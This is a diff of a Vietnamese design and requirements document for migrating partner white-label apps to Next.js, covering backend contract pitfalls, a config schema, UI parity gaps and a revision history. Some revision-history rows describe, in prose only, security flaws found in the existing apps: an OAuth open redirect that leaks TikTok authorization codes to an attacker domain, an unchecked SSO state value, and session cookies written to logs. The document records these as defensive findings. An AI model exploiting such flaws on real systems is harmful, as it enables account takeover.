+| Thẻ chiến dịch | Khung **tỉ lệ cố định**, panel `position: absolute` đè lên cover | Xếp nối tiếp; bấm mở một thẻ là cả hàng nhảy |
+| Lớp phủ khi mở panel | Trắng **10%** | Đen 40% — làm poster bạc trắng. Stylesheet của FE cũ ghi rõ họ đã thử 0.55 đen và bỏ |
+| Thẻ mốc thưởng | Chỉ tiêu đề + huy chương + tiền | Thêm `desc`; `desc` là một câu điều kiện đầy đủ, biến 5 thẻ gọn thành 5 đoạn văn |
+| Chip trên poster | view / bài đăng / **tiền thưởng**, số rút gọn, không chú thích | Chỉ số thứ ba là số creator; viết đủ số + chú thích làm chip rộng gấp đôi poster |
+| Trang văn bản dài | Breadcrumb **trong** thẻ, bề ngang **1040px**, khoảng cách đoạn sát | Breadcrumb ngoài, rail 1216px, lề đoạn rộng — trình soạn thảo xuất một `<p>` mỗi DÒNG nên danh sách năm ý thành năm câu rời rạc |
+
+**Quy tắc:** trước khi dựng một màn, **đo trên trang đang chạy** — cỡ chữ, khoảng cách,
+ngưỡng định dạng — thay vì suy từ màn đã dựng. Bộ token cho biết *màu gì*, không cho biết
+*to bao nhiêu ở màn nào*.
+
+**AC:**
+- [ ] Mỗi màn có một lần đối chiếu trực tiếp với trang đang chạy trước khi nghiệm thu
+- [ ] Ngưỡng và định dạng (8 ngày, `DD/MM/YYYY - HH:mm`) nằm trong **một** hàm dùng chung, có test — không lặp ở từng màn
+
+---
+
+### PC-022: `loading.tsx` ở gốc nuốt cả header và footer
+
+**Priority:** Must Have — yêu cầu mới tại v2.2
+
+**Vì sao cần.** Header và footer hiện nằm trong `PageFrame`, mà `PageFrame` do **từng trang**
+render. Nên một `app/loading.tsx` ở gốc thay **toàn bộ** đầu ra của route — kể cả chrome — và
+mỗi cú bấm làm cả màn hình nháy trắng rồi dựng lại. Người dùng đọc đó là trang bị tải lại.
+
+**Hai đường, phải chọn một:**
+
+1. **Không có `loading.tsx` ở gốc.** Next giữ trang hiện tại cho tới khi trang mới sẵn sàng.
+   Các khối vẫn chảy vào dần nhờ `Suspense` bọc từng section. Đây là trạng thái hiện tại.
+2. **Đưa chrome lên `app/layout.tsx`.** Lúc đó `loading.tsx` chỉ thay phần thân. Vướng một
+   điểm cần quyết: trên tên miền nhiều ADV, header hiện ADV nào là do **đường dẫn** quyết,
+   mà layout chỉ biết tên miền — nên hoặc chấp nhận header lấy ADV đầu tiên, hoặc đẩy phần
+   chọn ADV xuống một client component đọc `usePathname`.
+
+**AC:**
+- [ ] Chuyển trang KHÔNG làm header/footer biến mất rồi hiện lại
+- [ ] Nếu chọn đường 2, ghi rõ header hiển thị ADV nào trên tên miền nhiều ADV
+
+---
 
 ---
 
@@ -1225,6 +1574,33 @@ Lý do không phải kiến trúc cho đẹp, mà là một cái bẫy `creator-
 
 Bắt buộc `export const dynamic = 'force-dynamic'` — proxy bị cache thì người dùng này đọc được dữ liệu của người dùng khác.
 
+### Hợp đồng backend — tám điều chỉ lộ ra khi chạy với dữ liệu thật
+
+Tám điều dưới đây không nằm trong tài liệu API nào; tất cả tìm ra khi dựng màn hình chiến dịch, màn tài khoản và khi chạy thử với backend dev thật, và tất cả đều **hỏng lặng**: request trả `code: 1`, không có lỗi ở đâu, chỉ là màn hình thiếu dữ liệu.
+
+**1. `Origin` quyết định ADV nào được trả về — kể cả cổng.** `GET /events` và `GET /events/statistic` gọi `GetListPartnersByDomain(cc.GetAppOrigin())`, tức lọc `partners.allowDomains` theo header `Origin` (rơi về `Referer` nếu thiếu). Không có header thì tập đối tác rỗng và **danh sách chiến dịch rỗng ở mọi ADV** — vẫn `code: 1`, vẫn `"Thành công!"`. Các ứng dụng đang chạy không bao giờ gặp vì trình duyệt tự gắn `Origin`; `partner-app` render ở server nên **phải chuyển tiếp `Host` của request thành `Origin`**.
+
+Kèm theo: `pstring.GetHostNameByURL` trả `uri.Host`, tức **giữ nguyên cổng**. `localhost:8000` và `localhost` là hai tập đối tác khác nhau. Cắt cổng ở server sẽ làm request phía server resolve khác request phía trình duyệt **trên cùng một trang** — chạy production không lộ vì host thật không có cổng, chỉ vỡ ở môi trường dev.
+
+> Hệ quả cho **BFF proxy** ở trên: proxy đứng giữa thì `Origin` backend nhìn thấy là của proxy, không phải của trình duyệt. Route handler **phải chuyển tiếp `Origin` gốc**, nếu không mọi ADV mất danh sách chiến dịch ngay khi bật proxy.
+
+**2. Thời gian là chuỗi ISO, không phải `{ unix }`.** Mọi mốc thời gian đi qua `ptime.TimeResponse`, `MarshalJSON` trả `t.Time.Format(DateISOFormat)` — và trả **chuỗi rỗng**, không phải `null`, khi chưa đặt. Đọc theo hình dạng `{ unix }` thì mọi ngày trên toàn ứng dụng hiện trống mà không báo lỗi.
+
+**3. Một dòng bảng xếp hạng không có `view`/`cash`.** `UserEventResponse` trả `statistic.pointTotal` và `statistic.cashTotal`, mỗi cái tách `completed` và `pending`. Số của một dòng là **tổng hai phần**: bài đang đối soát vẫn tính vào thứ hạng, nên chỉ đọc `completed` sẽ cho dòng trên ít view hơn dòng dưới — bảng trông như sắp sai.
+
+**4. `code: 1` với `data: null` là "không tìm thấy", không phải thành công.** `GET /articles/:id` với id không tồn tại trả đúng như vậy. Lớp gọi API phải coi payload `null` là thiếu dữ liệu, nếu không màn hình đọc `article.title` trên `null` và vỡ trang thay vì hiện nhánh không-tìm-thấy.
+
+**5. Ảnh có BỐN hình dạng, tuỳ endpoint.** Cùng một khái niệm "ảnh" về theo bốn kiểu: chuỗi URL thuần (`cover` của bài đăng), `{ url }`, `{ dimensions: { sm|md|lg: { url } } }` (logo đối tác, ảnh bìa chiến dịch, icon) và `{ default|medium|high: { url } }` (thumbnail video). Ảnh bìa chiến dịch nằm ở `covers[0].default` — **không có khoá `photo`**, và mỗi entry còn giữ nhiều bản cắt khác (`stretch`). Đọc thiếu một dạng thì thẻ hiện nền phẳng trông như thiết kế cố ý.
+
+**6. Hai endpoint bài đăng dùng hai bộ tên cho cùng ba thứ.** `/partners/content-features` trả `cover` + `statistic.view.total` + `author`; `/events/:id/content` trả `thumbnail` + `view`. Ảnh đại diện có thể nằm ở `user.socialInfo.photo` khi `user.avatar` rỗng — tài khoản đăng nhập bằng mạng xã hội và chưa tải ảnh lên.
+---
+
+**7. Affiliate nằm ở tiền tố RIÊNG, và trả mảng trần.** `GET /affiliate/events/:id/campaigns`, không phải `/events/:id/campaigns` — đường dẫn thứ hai trả **404**, mà lớp gọi API biến 404 thành kết quả rỗng, nên cả khối Affiliate biến mất khỏi màn chi tiết **không một dấu vết**. Payload là **mảng trần** dưới `data`, không phải `{ list }`. Affiliate dùng chung một backend cho mọi app white-label và **không có tham số partner**: token của người dùng quyết định họ thuộc đối tác nào.
+
+**8. Response bảng xếp hạng mang sẵn siêu dữ liệu mà không màn nào đọc.** `period`, `periodStartAt`/`periodEndAt`, `rankBy`, `metrics`, `valueBasis`, `graceDays`, `isSettling` — tất cả đã về cùng danh sách dòng. Bỏ qua chúng thì bảng vô nghĩa: "hạng 1 với 500 view" không cho biết là tháng này hay luỹ kế, và người mới đăng bài không biết bảng tuần sẽ reset.
+
+Nguy nhất là `isSettling`. Trong những **ngày ân hạn** sau khi một kỳ đóng, bảng vẫn hiện kỳ **TRƯỚC** — người đăng bài hôm qua tìm không thấy mình và kết luận bảng hỏng. `metrics` cũng phải đọc: cột nào hiện và theo thứ tự nào là do nó quyết, gán cứng "view rồi cash" sẽ hiện cột thưởng cho ADV đã tắt, và đặt chỉ số xếp hạng xuống thứ hai trên bảng xếp theo tiền.
+
 ### Thay đổi hạ tầng chạy
 
 Mỗi ứng dụng hiện chạy `server.js` (Koa) để SSR, `Dockerfile` build `node:14.17.3` rồi `node server.js`. `partner-app` là Next.js — **Koa và `server.js` biến mất**, cách build và chạy container đổi hoàn toàn. Đây là phần việc devops phải biết trước khi tới E2.
@@ -1239,25 +1615,35 @@ Mỗi ứng dụng hiện chạy `server.js` (Koa) để SSR, `Dockerfile` build
 
 **Lược đồ `partner_app_configs`:**
 
-```
-partner        ObjectId
-status         draft | published
-version        int
+Cập nhật v1.8 theo lược đồ đã hiện thực. Hai điểm khác bản phác thảo trước:
+**bản nháp và bản đã xuất bản nằm ở hai collection** (bản xuất bản là bất biến, con trỏ
+`currentVersion` trỏ tới bản đang chạy — nhờ đó khôi phục chỉ là đổi con trỏ, không đụng
+bản nháp), và **`theme` là map mở** thay vì các khoá cố định.
 
-identity     { slug, brandName, domain }
-theme        { primary, primaryForeground, fontFamily, fontFiles[], colorsExtra{} }
-assets       { core{logo, logoMobile, logoFooter, favicon, ogImage, decorLeft, decorRight},
-               named{} }
+```
+partner-app-configs          ← mỗi ADV đúng MỘT bản ghi, chỉ mục duy nhất theo partner
+  partner        ObjectId
+  draft          <body>
+  currentVersion ObjectId    ← rỗng = chưa xuất bản lần nào
+  createdAt / updatedAt
+
+partner-app-config-versions  ← bất biến, chỉ mục duy nhất theo (partner, version)
+  partner / version / body / changelog / publishedBy / publishedAt
+
+<body>
+theme        { colors{}      ← map mở; 18 khoá chuẩn + khoá riêng của ADV
+               radius{}      ← map mở; 4 khoá chuẩn, giá trị 0 hợp lệ
+               fontFamily, fontFiles[{family, weight, style, url}] }
+             ← KHÔNG khoá nào bắt buộc; server hợp nhất với mặc định lúc trả (PC-002)
+assets       {}              ← map mở: logo, favicon, ogImage, badge tải app…
 content      { articleIds{qa, term, condition},     ← 3, KHÔNG phải 4: xem PC-007
                contact{hotline, email},
                social[{platform, url}],
-               footerBrandLink }
-seo          { title, description, keywords, ogImage, gtmId }
-modules      { contract, affiliate }
+               website, footerBrandLink }
+seo          {}              ← map mở: title, description, keywords, ogImage
+modules      {}              ← map cờ bật/tắt phân hệ
 sections     [{key, type, props}]
 slots        {}                      ← giữ chỗ, chưa hiện thực (PC-009)
-
-publishedAt / publishedBy / changelog
 ```
 
 Khoảng **20 trường**. `canonical` không lưu — sinh từ `Host`. `PartnerOpts` giữ nguyên vị trí hiện tại.
@@ -1370,11 +1756,35 @@ Khoảng **20 trường**. `canonical` không lưu — sinh từ `Host`. `Partne
 
 ---
 
+## 12b. Đối chiếu màn hình với `fecredit` — phần còn nợ
+
+Kiểm ngày 07/09 bằng cách mở song song `partner-app` và trang đang chạy, từng trang một.
+**Đã khớp:** trang chủ đối tác, chi tiết chiến dịch, thể lệ, hướng dẫn, bài đăng, liên hệ,
+bài viết. **Chưa dựng:**
+
+| Màn / tính năng | Đường dẫn ở `fecredit` | Ghi chú |
+|---|---|---|
+| Hoa hồng affiliate | `/hoa-hong-affiliate` | Chưa có route nào |
+| Chi tiết chiến dịch affiliate | `/:partner/:slug/affiliate/:campaignId` | Endpoint đã biết: `/affiliate/campaigns/:id` |
+| Nút nổi góc phải | `components/layout/main/floater-chat` | Mở modal hashtag khi đã đăng nhập; kèm quick actions |
+| Popup khuyến mãi | `/news?type=popup` | Hiện 1 lần/giờ, mốc lưu ở `localStorage` |
+
+**Chưa soi được:** cả nhóm màn tài khoản (`/tai-khoan`, `/thong-tin-thanh-toan`,
+`/ma-so-thue`, `/thong-tin-dinh-danh`, `/khai-bao-thue`, `/lien-ket-tai-khoan`,
+`/hop-dong-dien-tu`, `/trang-ca-nhan`, `/thong-bao`). Chúng đứng sau cổng đăng nhập, mà môi
+trường dev đăng nhập bằng Google thật — cần một tài khoản thật mới đối chiếu được. **Đây là
+khoảng trống nghiệm thu lớn nhất còn lại**, vì chín màn này chiếm phần lớn số màn của ứng
+dụng.
+
+---
+
 ## 13. Open Questions
 
 1. **Ngưỡng blast radius** — số đối tác tối đa trên một triển khai trước khi cần tách. Cần trước khi lên production.
-3. **Chủ sở hữu quy trình NFR-009** — ai quyết định phân loại một yêu cầu riêng của đối tác. Cần trước M2.
-3. **PC-012 nhóm khác biệt hành vi** — 4 file (`not-logged-in` Δ914, `header` Δ659, `models/main` Δ288, `interfaces/event` Δ251) cần **đối tác chấp thuận** trước cutover. Chưa xác định đầu mối phía 5 đối tác. Cần trước M1.
+2. **Chủ sở hữu quy trình NFR-009** — ai quyết định phân loại một yêu cầu riêng của đối tác. Cần trước M2.
+3. **Tài khoản thật trên dev để nghiệm thu nhóm màn đăng nhập** — chín màn tài khoản chưa từng được đối chiếu với trang đang chạy. Cần trước M1.
+4. **Chọn đường cho PC-022** — bỏ hẳn `loading.tsx` ở gốc (hiện tại) hay đưa chrome lên layout. Ảnh hưởng tới việc header hiển thị ADV nào trên tên miền nhiều ADV.
+5. **PC-012 nhóm khác biệt hành vi** — 4 file (`not-logged-in` Δ914, `header` Δ659, `models/main` Δ288, `interfaces/event` Δ251) cần **đối tác chấp thuận** trước cutover. Chưa xác định đầu mối phía 5 đối tác. Cần trước M1.
 
 ### Đã đóng
 
@@ -1396,6 +1806,11 @@ Khoảng **20 trường**. `canonical` không lưu — sinh từ `Host`. `Partne
 |---|---|---|
 | 1.0 | 2026-09-03 | Bản đầu. Chốt phương án ứng dụng mới trên nền tảng hiện đại, backend giữ nguyên, `creator-os` là tài liệu tham khảo. Phạm vi khi đó: 15 ứng dụng, giữ nguyên không migrate |
 | 1.1 | 2026-09-04 | Đổi phạm vi sang migrate toàn bộ 15 ứng dụng theo 6 đợt. Bổ sung PC-011 → PC-013, NFR-007 → NFR-009. Sửa PC-001 theo mô hình domain → tập đối tác |
+| 2.2 | 2026-09-07 | **Đính chính sau khi soi từng trang song song với trang đang chạy.** Mục 7 lên **tám** điều: **affiliate nằm ở tiền tố riêng** `/affiliate/events/:id/campaigns` và trả **mảng trần** (đường cũ trả 404, mà lớp gọi API biến 404 thành rỗng nên cả khối Affiliate biến mất không dấu vết), và **response bảng xếp hạng mang sẵn siêu dữ liệu chưa ai đọc** (`period`, biên kỳ, `rankBy`, `metrics`, `graceDays`, `isSettling` — nguy nhất là `isSettling`: trong ngày ân hạn bảng hiện kỳ TRƯỚC nên người đăng bài hôm qua tưởng bảng hỏng). **PC-019 lên năm thứ**: SVGO đổi mọi id thành `a` nên 51/193 icon dùng `clipPath` tranh nhau một id và chín trên mười cái bị cắt theo vùng clip của glyph khác; Tailwind v4 đổi mặc định `border-color` sang `currentColor` nên mọi component shadcn viền màu chữ. Bổ sung **PC-020 — dải màu là một loại token riêng** (18 màu phẳng không tả được `fecredit`; lưu thành dữ liệu chứ không phải chuỗi CSS; tối thiểu hai chặng; mọi chỗ dùng rơi về màu phẳng), **PC-021 — quy ước hiển thị đo TỪNG MÀN** (tiêu đề trang chủ 36px nhưng màn chi tiết 20px; tuổi bài tương đối trong 8 ngày; thẻ chiến dịch khung tỉ lệ cố định + panel đè lên; lớp phủ trắng 10% chứ không phải đen 40% — FE cũ đã thử và bỏ), **PC-022 — `loading.tsx` ở gốc nuốt cả header/footer**. Bổ sung **mục 12b** liệt kê phần còn nợ: hai màn affiliate, nút nổi, popup, và **cả chín màn tài khoản chưa soi được** vì đứng sau cổng đăng nhập Google thật |
+| 2.1 | 2026-09-07 | **Đính chính sau khi chạy `partner-app` với backend dev thật** — mục 7 lên **sáu** điều: bổ sung **ảnh có BỐN hình dạng tuỳ endpoint** (chuỗi URL thuần · `{url}` · `{dimensions:{sm|md|lg:{url}}}` · `{default|medium|high:{url}}`; ảnh bìa chiến dịch ở `covers[0].default`, **không có khoá `photo`**) và **hai endpoint bài đăng dùng hai bộ tên cho cùng ba thứ** (`cover`/`statistic.view.total`/`author` so với `thumbnail`/`view`; ảnh đại diện rơi về `user.socialInfo.photo`). Cả hai chỉ lộ ra với dữ liệu thật — dữ liệu seed không có ảnh nên màn hình trông vẫn đúng. Ghi nhận cấu hình chạy song song trong giai đoạn quá độ: `/partners/app-config` chưa deploy lên dev nên tách `PARTNER_CONFIG_API_BASE_URL` (cấu hình lấy ở local, dữ liệu lấy ở dev) và `DEV_FORCE_ORIGIN` (ghim Origin về host mà môi trường dich biết, vì `allowDomains` của nó không có `localhost`) |
+| 2.0 | 2026-09-06 | **Đính chính từ khi dựng `partner-app`** — bổ sung mục 7 "Hợp đồng backend — bốn điều chỉ lộ ra khi render ở server": `Origin` quyết định tập ADV **và giữ nguyên cổng** (không có header thì danh sách chiến dịch rỗng ở mọi ADV mà vẫn `code: 1`; **hệ quả trực tiếp cho BFF proxy**: proxy phải chuyển tiếp `Origin` gốc, không thì bật proxy là mất chiến dịch); thời gian là **chuỗi ISO** qua `ptime.TimeResponse`, không phải `{ unix }`; dòng bảng xếp hạng là `statistic.pointTotal`/`cashTotal` tách `completed` + `pending` và phải **cộng cả hai**; `code: 1` + `data: null` là không-tìm-thấy. Cả bốn đều hỏng lặng. Bổ sung **PC-019 — cạm bẫy nền tảng khi dựng lại giao diện**: SVGR xoá `viewBox` nên **cả 161 icon** vẽ lệch trong khung nhỏ; token `muted` của partner là màu **chữ** còn shadcn coi là màu **nền**; `background` của partner là **nền trang có sắc** nên hộp thoại `bg-background` trông như mất lớp phủ |
+| 1.9 | 2026-09-04 | **Viết lại mục 2.6 thành DANH SÁCH PHÁT HIỆN, không phải danh sách đã sửa** — dự án làm trên thư mục mới, không sửa mã của 5 ứng dụng đang chạy; việc xử lý chúng là quyết định của chủ sở hữu và là task độc lập. Bổ sung cột **"hệ mới có mang theo không"**: PRE-2/3/4/5 thì không (lược đồ mới đã chặn sẵn), nhưng **PRE-1 và PRE-8 thì CÓ** nếu port nguyên luồng uỷ quyền theo quyết định 04/09 — nên hai mục này thành ràng buộc thiết kế cho `partner-app`. Bổ sung **PRE-8** (`state` của SSO AccessTrade sinh ra nhưng không bao giờ được kiểm, cộng hai lỗi phụ: băm mốc thời gian nên đoán được, và tính một lần lúc nạp module). Xác minh cụ thể đường khai thác **PRE-1** (`query.state` làm gốc URL chuyển hướng → giao mã uỷ quyền TikTok của nạn nhân cho tên miền kẻ tấn công, 5 app × 2 trang) — làm rõ câu "giữ nguyên 04/09" nói về việc `partner-app` port nguyên luồng, không phải kết luận an toàn. **PRE-4 rộng hơn khảo sát đầu**: 20 chỗ, cả `event-detail` và `partner-home`. **PRE-5 kèm lỗi mới**: `console.log` in nguyên `ctx.request`, tức ghi cookie phiên và `Authorization` vào log. **PRE-3 cần người quyết**: không ai biết hotline/email/mạng xã hội đúng của `lusso` và `parasola` |
+| 1.8 | 2026-09-04 | **Đính chính từ khi triển khai** — bước nền backend và màn hình admin đã dựng xong và chạy thử đầu-cuối với MongoDB, Redis và trình duyệt thật. Bổ sung **PC-018 — lược đồ cấu hình do server phát ra**: danh mục section, 18 khoá màu, giá trị mặc định và 7 trường bắt buộc đều lấy từ một endpoint, admin không khai lại; kèm `defaultSections` để ADV mới mở màn hình đã có sẵn trang giống các FE đang chạy. **PC-002**: gỡ ràng buộc "phải khai `primary`" — mặc định là để KHÔNG khai, hợp nhất chạy ở server; ghi rõ `primaryForeground` **không tồn tại** (nhắc nhầm ở v1.2); bo góc `0` là giá trị hợp lệ. **PC-007**: dấu hiệu ADV khác lấy **host** thay vì URL đầy đủ — test đầu-cuối bắt được ca `lusso` mang link CDN của HDBank mà bản cũ bỏ lọt; dò đệ quy qua cả `assets` và mảng object. **PC-015**: ghi hai bẫy sẵn có làm vai trò mới vô hiệu — `constants.Roles` là **danh sách vai trò thứ ba** tách rời `StaffRole`/`StaffRoleName`, và `GenerateRole` bỏ qua mọi môi trường đã có sẵn vai trò; cả hai đã sửa, có test canh. Bổ sung AC cho hai lỗi UI tìm ra trên trình duyệt (hex sai không báo tại chỗ; hộp thoại xuất bản che mất ô cần sửa khi lỗi) |
 | 1.7 | 2026-09-04 | Đóng ba câu hỏi về người. **NFR-009 viết lại thành chính sách**: theme chung, ADV không có quyền chỉnh riêng — không cần người đứng cổng. **PC-012 viết lại thành gộp về bản đầy đủ nhất**, kèm ma trận tính năng 5 ADV: `vpbank` chỉ đi sau (thiếu `isMustInputProfile`, `Tooltip`, `useResponsive`, link Q&A), `FAQCollapse` đã là section `faq` — **không ADV nào mất gì, 0 cờ mới, không cần ADV chấp thuận**. **PC-013 bỏ điều kiện xác nhận từ ADV** — giá trị cấu hình sai là lỗi nhập liệu, đã có kiểm tra chéo của PC-007 làm lưới an toàn |
 | 1.6 | 2026-09-04 | Bổ sung **PC-017 — nội dung tĩnh, hai phạm vi**: Thể lệ và Hướng dẫn là per-chiến-dịch (`EventRaw.Guide`/`Privacy`, form admin đã có) và **không kéo lên per-ADV**; chỉ Q&A, Điều khoản, Chính sách là per-ADV. Đây là mục thứ năm của mô hình cấu hình theo brief, trước đó chỉ nằm ở Revision History. Ghi hệ quả lịch: ADV chạy 2 chiến dịch cần soạn **7 bài**, không phải 3. Bổ sung **phân tích và ước lượng trình sửa section** vào PC-008 — antd 4.20 có sẵn `Form.List.move()`, khuôn mẫu `covers` 75 dòng, 4 thư viện kéo thả đã cài chưa dùng; ước ~960 dòng, 6–8 ngày; **xếp sau bước 3**, không nằm trên đường găng |
 | 1.5 | 2026-09-04 | Bổ sung **mục 2.9 — bản đồ chuyển umi → Next**: bảy hệ con phải viết lại, đối chiếu với lời giải của `creator-os`; bốn bài học họ đã trả giá (`rewrites()` nướng env lúc build · proxy phải `force-dynamic` · refresh single-flight · 403 pwreset tách khỏi 401); **chốt giữ `localStorage`** cho auth, nhưng **lấy BFF proxy**. Sửa lại đánh giá chi phí chuyển nền tảng — trước đó đo `getInitialProps` là đo sai đối tượng. Bổ sung **PRE-6** (mỗi trang nạp hai container GTM, ba ADV bắn vào container của ADV khác) và **PRE-7** (hai bản Bootstrap trên cùng trang). Bổ sung mẫu xem trước không open-redirect vào PC-007 và BFF proxy vào mục 7 |
